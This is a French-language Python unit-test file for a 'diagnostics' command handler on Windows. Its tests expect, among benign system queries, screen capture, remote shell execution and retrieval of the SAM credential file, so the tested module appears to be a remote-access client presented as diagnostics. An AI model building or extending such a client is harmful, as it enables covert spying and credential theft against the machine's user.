import unittest
import platform
from diagnostics import traiter_demande


class TestDiagnostics(unittest.TestCase):

    def diagnostic(self, commande):
        return traiter_demande({
            "type": "diagnostic_request",
            "commande": commande
        })

    def test_help(self):
        reponse = self.diagnostic("HELP")
        self.assertEqual(reponse["type"], "diagnostic_response")
        # On est passé à 10 commandes
        self.assertEqual(len(reponse["resultat"]["commandes"]), 10)

    def test_hostname(self):
        reponse = self.diagnostic("HOSTNAME")
        self.assertEqual(
            reponse["resultat"]["hostname"],
            platform.node()
        )

    def test_os(self):
        reponse = self.diagnostic("OS")
        self.assertEqual(
            reponse["resultat"]["os"],
            platform.system()
        )

    def test_arch(self):
        reponse = self.diagnostic("ARCH")
        self.assertEqual(
            reponse["resultat"]["architecture"],
            platform.machine()
        )

    def test_network(self):
        reponse = self.diagnostic("NETWORK")
        adresses = reponse["resultat"]["ipv4"]

        self.assertIsInstance(adresses, list)

        for ip in adresses:
            self.assertFalse(ip.startswith("127."))

    def test_info(self):
        reponse = self.diagnostic("INFO")
        resultat = reponse["resultat"]

        self.assertIn("hostname", resultat)
        self.assertIn("os", resultat)
        self.assertIn("release", resultat)
        self.assertIn("architecture", resultat)

    def test_status(self):
        reponse = self.diagnostic("STATUS")
        self.assertEqual(
            reponse["resultat"]["message"],
            "Client Windows actif"
        )

    def test_screenshot(self):
        reponse = self.diagnostic("SCREENSHOT")
        self.assertEqual(reponse["type"], "diagnostic_response")
        self.assertEqual(reponse["commande"], "SCREENSHOT")
        self.assertIn("image_base64", reponse["resultat"])

    def test_exec(self):
        # On teste une commande autorisee dans la liste blanche
        reponse = traiter_demande({
            "type": "diagnostic_request",
            "commande": "EXEC",
            "args": "whoami"
        })
        self.assertEqual(reponse["type"], "diagnostic_response")
        self.assertIn("sortie", reponse["resultat"])

    def test_sam(self):
        reponse = self.diagnostic("SAM")
        self.assertEqual(reponse["type"], "diagnostic_response")
        self.assertIn("fichier_sam", reponse["resultat"])

    def test_commande_inconnue(self):
        reponse = self.diagnostic("TEST")
        self.assertEqual(reponse["type"], "error")

    def test_format_invalide(self):
        reponse = traiter_demande("Bonjour")
        self.assertEqual(reponse["type"], "error")

    def test_type_invalide(self):
        reponse = traiter_demande({})
        self.assertEqual(reponse["type"], "error")

    def test_commande_absente(self):
        reponse = traiter_demande({
            "type": "diagnostic_request"
        })
        self.assertEqual(reponse["type"], "error")

    def test_commande_minuscule(self):
        reponse = self.diagnostic("info")
        self.assertEqual(reponse["commande"], "INFO")

    def test_commande_avec_espaces(self):
        reponse = self.diagnostic("  STATUS  ")
        self.assertEqual(reponse["commande"], "STATUS")

    def test_commande_vide(self):
        reponse = self.diagnostic("")
        self.assertEqual(reponse["type"], "error")

    def test_demande_none(self):
        reponse = traiter_demande(None)
        self.assertEqual(reponse["type"], "error")


if __name__ == "__main__":
    unittest.main(verbosity=2)